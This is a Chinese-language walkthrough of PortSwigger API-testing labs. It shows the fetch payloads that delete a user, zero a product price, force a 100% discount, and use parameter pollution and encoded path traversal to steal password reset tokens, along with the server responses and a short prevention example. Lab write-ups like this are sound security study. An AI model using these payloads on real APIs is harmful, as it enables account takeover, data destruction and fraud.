---
title: API testing
description: API testing
---

## Lab: Exploiting an API endpoint using documentation

| Dimension | Description                                                                                      |
| --------- | ------------------------------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/api-testing#discovering-api-documentation                   |
| Lab       | https://portswigger.net/web-security/api-testing/lab-exploiting-api-endpoint-using-documentation |

這題的 `/api` 有公開 API 文件

登入後

```js
fetch(`${location.origin}/api/user/carlos`, { method: "delete" });
```

成功解題～

## Lab: Finding and exploiting an unused API endpoint

| Dimension | Description                                                                         |
| --------- | ----------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/api-testing#identifying-api-endpoints          |
| Lab       | https://portswigger.net/web-security/api-testing/lab-exploiting-unused-api-endpoint |

這題算蠻明顯的(?)進入商品頁有戳 `/api/products/1/price`，嘗試構造

```js
fetch(`${location.origin}/api/products/1/price`, {
  method: "patch",
  headers: {
    "Content-Type": "application/json",
  },
  body: JSON.stringify({ price: 0 }),
});
```

## Lab: Exploiting a mass assignment vulnerability

| Dimension | Description                                                                                   |
| --------- | --------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/api-testing#mass-assignment-vulnerabilities              |
| Lab       | https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability |

這題我嘗試過 `/change-email` 搭配 `isAdmin`，也嘗試 PATCH `/product?productId=1` 都沒用

後來發現 `/api` 有公開 API 文件，嘗試

```js
fetch(`${location.origin}/api/checkout`, {
  method: "POST",
  headers: {
    "content-type": "application/json",
  },
  body: JSON.stringify({
    chosen_products: [
      {
        product_id: "1",
        quantity: 1,
        item_price: 0,
      },
    ],
  }),
});
```

說錢錢不夠，之後嘗試

```js
fetch(`${location.origin}/api/checkout`, {
  method: "POST",
  headers: {
    "content-type": "application/json",
  },
  body: JSON.stringify({
    chosen_discount: { percentage: 100 },
    chosen_products: [
      {
        product_id: "1",
        quantity: 1,
      },
    ],
  }),
});
```

成功通關～果然有 API 文件就是舒服

## server-side parameter pollution in the query string

https://portswigger.net/web-security/api-testing/server-side-parameter-pollution?a=1#testing-for-server-side-parameter-pollution-in-the-query-string

1. 利用 (%23) # 截斷隱藏的 querystring

這裡很巧妙的利用了 URL encode 的技巧

假設 client 端送了 `GET /user?name=peter`

server 會再去戳一個 internal API `GET /users/search?name=peter&publicProfile=true`

那 client 端可以送 `GET /user?name=peter%23foo`

server 取得 searchParams.name 會拿到 `peter#foo`

```js
// 假設 server 是 NodeJS，使用 URLSearchParams 來解析 querystring
// 不管用什麼程式語言，核心概念是，解析時會經過一次 URL decode
new URLSearchParams(`name=peter%23foo`).get("name"); // peter#foo
```

server 再把 `peter#foo` 加到 internal API 的 querystring `GET /users/search?name=peter#foo&publicProfile=true`

```js
// 假設 server 是 NodeJS，使用 fetch 來發送 HTTP Request 到 internal api
// 不管用什麼程式語言，弱點在於，使用字串拼接 querystring
fetch(
  `http://internal.api.com/users/search?name=${new URLSearchParams(`name=peter%23foo`).get("name")}&publicProfile=true`,
);
```

這樣 URL fragment 就會被截斷，我們就可以成功把 `&publicProfile=true` 截斷，也許就可以取得非公開的使用者資訊

2. 利用 %26 (&) 注入新的 querystring

這裡也是很巧妙的利用了 URL encode 的技巧

假設 client 端送了 `GET /user?name=peter`

server 會再去戳一個 internal API `GET /users/search?name=peter`

那 client 端可以送 `GET /user?name=peter%26role=admin`

server 取得 searchParams.name 會拿到 `peter&role=admin`

```js
// 假設 server 是 NodeJS，使用 URLSearchParams 來解析 querystring
// 不管用什麼程式語言，核心概念是，解析時會經過一次 URL decode
new URLSearchParams(`name=peter%26role=admin`).get("name"); // peter&role=admin
```

server 再把 `peter&role=admin` 加到 internal API 的 querystring `GET /users/search?name=peter&role=admin`

```js
// 假設 server 是 NodeJS，使用 fetch 來發送 HTTP Request 到 internal api
// 不管用什麼程式語言，弱點在於，使用字串拼接 querystring
fetch(
  `http://internal.api.com/users/search?name=${new URLSearchParams(`name=peter%26role=admin`).get("name")}`,
);
```

這樣 URL searchParams 就會注入 `&role=admin`，也許就可以取得 admin 使用者資訊

3. How to prevent?

```js
const name = new URLSearchParams(`name=peter%26role=admin`).get("name");

// ❌，字串拼接
const vulnSearch = `name=${name}`; // name=peter&role=admin

// ✅，使用程式語言提供的 searchParams.set
const sp = new URLSearchParams();
sp.set("name", name);
const robustSearch = sp.toString(); // name=peter%26role%3Dadmin
```

## Lab: Exploiting server-side parameter pollution in a query string

| Dimension | Description                                                                                                                                      |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/api-testing/server-side-parameter-pollution#testing-for-server-side-parameter-pollution-in-the-query-string |
| Lab       | https://portswigger.net/web-security/api-testing/server-side-parameter-pollution/lab-exploiting-server-side-parameter-pollution-in-query-string  |

這題是 querystring 會吃到後面的那個

`/product?productId=1&productId=2` 實際上會去拿 `productId=2`

忘記密碼功能，觀察 forgotPassword.js

```js
forgotPwdReady(() => {
  const queryString = window.location.search;
  const urlParams = new URLSearchParams(queryString);
  const resetToken = urlParams.get("reset-token");
  if (resetToken) {
    window.location.href = `/forgot-password?reset_token=${resetToken}`;
  } else {
    const forgotPasswordBtn = document.getElementById("forgot-password-btn");
    forgotPasswordBtn.addEventListener("click", displayMsg);
  }
});
```

嘗試訪問 `/forgot-password?reset_token=1`，只得到 "Invalid token"

這題我做到這邊就卡關了，後來是參考解答的步驟

1. 嘗試注入 (%26) &，新的 querystring key value

```js
fetch(`${location.origin}/forgot-password`, {
  headers: {
    "content-type": "x-www-form-urlencoded",
  },
  body: "csrf=fWqdhuV1N3QZGXTm5Z4JRpmvUJWpIUWg&username=administrator%26a=1",
  method: "POST",
  credentials: "include",
});
```

回傳

```json
{ "error": "Parameter is not supported." }
```

2. 嘗試注入 (%23) #，把 URL 後面的部分截斷

```js
fetch(`${location.origin}/forgot-password`, {
  headers: {
    "content-type": "x-www-form-urlencoded",
  },
  body: "csrf=fWqdhuV1N3QZGXTm5Z4JRpmvUJWpIUWg&username=administrator%23",
  method: "POST",
  credentials: "include",
});
```

回傳

```json
{ "error": "Field not specified." }
```

3. 嘗試注入 %26field=1

```js
fetch(`${location.origin}/forgot-password`, {
  headers: {
    "content-type": "x-www-form-urlencoded",
  },
  body: "csrf=fWqdhuV1N3QZGXTm5Z4JRpmvUJWpIUWg&username=administrator%26field=1",
  method: "POST",
  credentials: "include",
});
```

回傳

```json
{ "type": "ClientError", "code": 400, "error": "Invalid field." }
```

4. 結合 forgotPassword.js，嘗試注入 %26field=reset_token

```js
fetch(`${location.origin}/forgot-password`, {
  headers: {
    "content-type": "x-www-form-urlencoded",
  },
  body: "csrf=fWqdhuV1N3QZGXTm5Z4JRpmvUJWpIUWg&username=administrator%26field=reset_token",
  method: "POST",
  credentials: "include",
});
```

回傳

```json
{ "type": "reset_token", "result": "9957tpfxcpcr9knzp77b7lhjhk50ynut" }
```

接著訪問 `/forgot-password?reset_token=9957tpfxcpcr9knzp77b7lhjhk50ynut` 就成功通關～

## Lab: Exploiting server-side parameter pollution in a REST URL

| Dimension | Description                                                                                                                                 |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/api-testing/server-side-parameter-pollution#testing-for-server-side-parameter-pollution-in-rest-paths  |
| Lab       | https://portswigger.net/web-security/api-testing/server-side-parameter-pollution/lab-exploiting-server-side-parameter-pollution-in-rest-url |

工具包：

假設 client 發起 `GET /edit_profile.php?name=peter`，server 背後會去戳 `GET /api/private/users/peter`

那 client 可以構造 `GET /edit_profile.php?name=peter%2f..%2fadmin`，server 就會變成去戳 `GET /api/private/users/peter/../admin` => `GET /api/private/users/admin`

嘗試

```js
fetch(`${location.origin}/forgot-password`, {
  headers: {
    "content-type": "x-www-form-urlencoded",
  },
  body: "csrf=ft2vWo0d3sKWAvlbB010wvFEVVKU0vau&username=administrator%26a=1",
  method: "POST",
  credentials: "include",
});
```

回傳

```json
{
  "type": "error",
  "result": "The provided username \"administrator&a=1\" does not exist"
}
```

嘗試

```js
fetch(`${location.origin}/forgot-password`, {
  headers: {
    "content-type": "x-www-form-urlencoded",
  },
  body: "csrf=ft2vWo0d3sKWAvlbB010wvFEVVKU0vau&username=administrator%23a=1",
  method: "POST",
  credentials: "include",
});
```

回傳

```json
{
  "type": "error",
  "result": "Invalid route. Please refer to the API definition"
}
```

嘗試

```js
fetch(`${location.origin}/forgot-password`, {
  headers: {
    "content-type": "x-www-form-urlencoded",
  },
  body: "csrf=ft2vWo0d3sKWAvlbB010wvFEVVKU0vau&username=%2F..%2F..%2F..%2F..%2F",
  method: "POST",
  credentials: "include",
});
```

回傳

```json
{
  "error": "Unexpected response from API server:\n<html>\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Not Found<\/title>\n<\/head>\n<body>\n    <h1>Not found<\/h1>\n    <p>The URL that you requested was not found.<\/p>\n<\/body>\n<\/html>\n"
}
```

看起來 `/../../../../` 就是根目錄了(?)

嘗試

```js
fetch(`${location.origin}/forgot-password`, {
  headers: {
    "content-type": "x-www-form-urlencoded",
  },
  body: "csrf=ft2vWo0d3sKWAvlbB010wvFEVVKU0vau&username=%2F..%2F..%2F..%2F..%2Fapi",
  method: "POST",
  credentials: "include",
});
```

回傳

```json
{
  "type": "error",
  "result": "Invalid route. Please refer to the API definition"
}
```

看來第一層應該是 `api` (?)，因為嘗試 `bpi` 會得到跟上上方一樣的答案

```json
{
  "error": "Unexpected response from API server:\n<html>\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Not Found<\/title>\n<\/head>\n<body>\n    <h1>Not found<\/h1>\n    <p>The URL that you requested was not found.<\/p>\n<\/body>\n<\/html>\n"
}
```

後來我嘗試用 [Discovering API documentation](https://portswigger.net/web-security/api-testing#discovering-api-documentation) 給的 API Document Endpoints

- /api
- /swagger/index.html
- /openapi.json
- /api/swagger/v1
- /api/swagger
- /api

結果都失敗，我這邊有看一下答案，才發現我少了最重要的 (%23) #，這就跟 SQL Injection 的 `-- comment` 是一樣的概念，用來截斷後面的 URL 或是 SQL String

所以後來嘗試

```js
fetch(`${location.origin}/forgot-password`, {
  headers: {
    "content-type": "x-www-form-urlencoded",
  },
  body: "csrf=ft2vWo0d3sKWAvlbB010wvFEVVKU0vau&username=%2F..%2F..%2F..%2F..%2Fopenapi.json%23",
  method: "POST",
  credentials: "include",
});
```

回傳

```json
{
  "openapi": "3.0.0",
  "info": {
    "title": "User API",
    "version": "2.0.0"
  },
  "paths": {
    "/api/internal/v1/users/{username}/field/{field}": {
      "get": {
        "tags": [
          "users"
        ],
        "summary": "Find user by username",
        "description": "API Version 1",
        "parameters": [
          {
            "name": "username",
            "in": "path",
            "description": "Username",
            "required": true,
            "schema": {
        ...
```

雖然 API Document 有被截斷，但結果真的跟我 exploit 的一樣，第一層是 api

之後就先用正常 UI 操作忘記密碼的方式，這步驟應該是會產生 passwordResetToken，之後再

```js
fetch(`${location.origin}/forgot-password`, {
  headers: {
    "content-type": "x-www-form-urlencoded",
  },
  body: "csrf=VhZqXhbhPXLtHMZh7VD8pNjI06kh8TjV&username=%2F..%2F..%2F..%2F..%2Fapi%2Finternal%2Fv1%2Fusers%2Fadministrator%2Ffield%2FpasswordResetToken%23",
  method: "POST",
  credentials: "include",
});
```

回傳

```json
{
  "type": "passwordResetToken",
  "result": "33d8nhkg13w2zrxkaf7d0986hvj1oyp0"
}
```

這題跟上面一樣，要先觀察 forgotPassword.js 的行為，得知要 retrieve 的欄位是 passwordResetToken

```js
forgotPwdReady(() => {
  const queryString = window.location.search;
  const urlParams = new URLSearchParams(queryString);
  const resetToken = urlParams.get("reset-token");
  if (resetToken) {
    window.location.href = `/forgot-password?passwordResetToken=${resetToken}`;
  } else {
    const forgotPasswordBtn = document.getElementById("forgot-password-btn");
    forgotPasswordBtn.addEventListener("click", displayMsg);
  }
});
```

## 小結

這系列的 Labs 讓我對於 API 的邊界測試，或者是說滲透測試，有不一樣的觀點，以前沒有想過可以玩出 server-side parameter pollution 的花樣

## 參考資料

- https://portswigger.net/web-security/api-testing
